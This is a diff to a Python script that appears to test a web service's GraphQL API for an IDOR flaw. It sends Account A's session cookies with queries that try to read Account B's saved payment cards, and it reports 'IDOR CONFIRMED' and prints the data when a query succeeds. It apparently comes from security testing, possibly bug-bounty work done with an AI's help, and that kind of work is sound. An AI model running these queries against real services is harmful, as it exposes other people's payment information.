@@ -77,60 +77,57 @@ def main():
     except Exception:
         print(r.text[:500])
 
-    # ── Step 3: me — find correct payment field name ──────────────────────────
-    section("Step 3: Probe me{} for payment field names")
-    payment_field_names = [
-        "paymentCards", "paymentMethods", "paymentSources",
-        "savedCards", "creditCards", "stripePaymentMethods",
-        "checkoutPaymentMethods", "walletAddresses",
-    ]
-    working_field = None
-    for field in payment_field_names:
-        r = gql(cookies, f"{{ me {{ {field} {{ __typename }} }} }}")
-        if "Cannot query field" in r.text:
-            print(f"  {field:35s} → DOES NOT EXIST on web schema")
-        elif '"errors"' in r.text:
-            print(f"  {field:35s} → Error: {r.text[:100]}")
+    # ── Step 3: Confirm me.cards works (correct field name confirmed) ─────────
+    section("Step 3: Confirm me.cards (own payment data)")
+    CARD_QUERY = "cards(first:10) { edges { node { id cardDescription cardReference cardType gateway default } } }"
+    r = gql(cookies, f"{{ me {{ id {CARD_QUERY} }} }}")
+    print(f"HTTP {r.status_code}: {r.text[:600]}")
+    try:
+        my_cards = r.json().get("data", {}).get("me", {}).get("cards", {}).get("edges", [])
+        if my_cards:
+            print(f"\nAccount A has {len(my_cards)} saved card(s) — confirmed field name 'cards' works")
         else:
-            print(f"  {field:35s} → EXISTS! Response: {r.text[:200]}")
-            working_field = field
+            print("\nAccount A has no saved cards (field exists, just empty)")
+    except Exception:
+        pass
 
     # ── Step 4: IDOR tests — Account A's cookies → Account B's data ──────────
     section(f"Step 4: IDOR tests against Account B (id={B_ID}, username={B_USERNAME})")
+    print(f"Goal: read Account B's cards as Account A\n")
+
+    CARD_FRAG = f"cards(first:10) {{ edges {{ node {{ id cardDescription cardReference cardType gateway default }} }} }}"
 
     queries = [
         ("user(id) direct",
-         f'{{ user(id: "{B_ID}") {{ {working_field or "paymentCards"} {{ __typename }} walletAddresses {{ address }} }} }}'),
-        ("alias me + victim",
-         f'{{ me {{ id }} victim: user(id: "{B_ID}") {{ {working_field or "paymentCards"} {{ __typename }} }} }}'),
+         f'{{ user(id: "{B_ID}") {{ id {CARD_FRAG} }} }}'),
+        ("alias me + victim user(id)",
+         f'{{ me {{ id }} victim: user(id: "{B_ID}") {{ {CARD_FRAG} }} }}'),
         ("publicUser(username)",
-         f'{{ publicUser(username: "{B_USERNAME}") {{ {working_field or "paymentCards"} {{ __typename }} walletAddresses {{ address }} }} }}'),
+         f'{{ publicUser(username: "{B_USERNAME}") {{ id {CARD_FRAG} }} }}'),
         ("userByUsername",
-         f'{{ userByUsername(username: "{B_USERNAME}") {{ {working_field or "paymentCards"} {{ __typename }} }} }}'),
+         f'{{ userByUsername(username: "{B_USERNAME}") {{ id {CARD_FRAG} }} }}'),
         ("profile(username)",
-         f'{{ profile(username: "{B_USERNAME}") {{ {working_field or "paymentCards"} {{ __typename }} }} }}'),
+         f'{{ profile(username: "{B_USERNAME}") {{ id {CARD_FRAG} }} }}'),
     ]
 
     for name, q in queries:
         r = gql(cookies, q)
-        print(f"\n  [{name}]")
-        print(f"  HTTP {r.status_code}  {r.text[:400]}")
+        print(f"  [{name}]")
+        print(f"  HTTP {r.status_code}  {r.text[:500]}")
 
-        # Check for actual payment data
         try:
             d = r.json()
             for key in ["user", "victim", "publicUser", "userByUsername", "profile"]:
                 node = d.get("data", {}).get(key)
                 if node:
-                    pf = working_field or "paymentCards"
-                    cards = node.get(pf)
-                    wallets = node.get("walletAddresses")
-                    if cards or wallets:
+                    edges = node.get("cards", {}).get("edges", []) if node.get("cards") else []
+                    if edges:
                         print(f"\n  *** IDOR CONFIRMED *** {name}")
-                        print(f"  Account A read Account B's data via {name}")
-                        print(f"  Data: {json.dumps(node)}")
+                        print(f"  Account A (anyakoa) read Account B's (anyako0810) payment cards!")
+                        print(f"  Full data: {json.dumps(node)}")
         except Exception:
             pass
+        print()
 
     print("\n" + "="*60)
     print("  Done. Paste the full output above to Claude.")
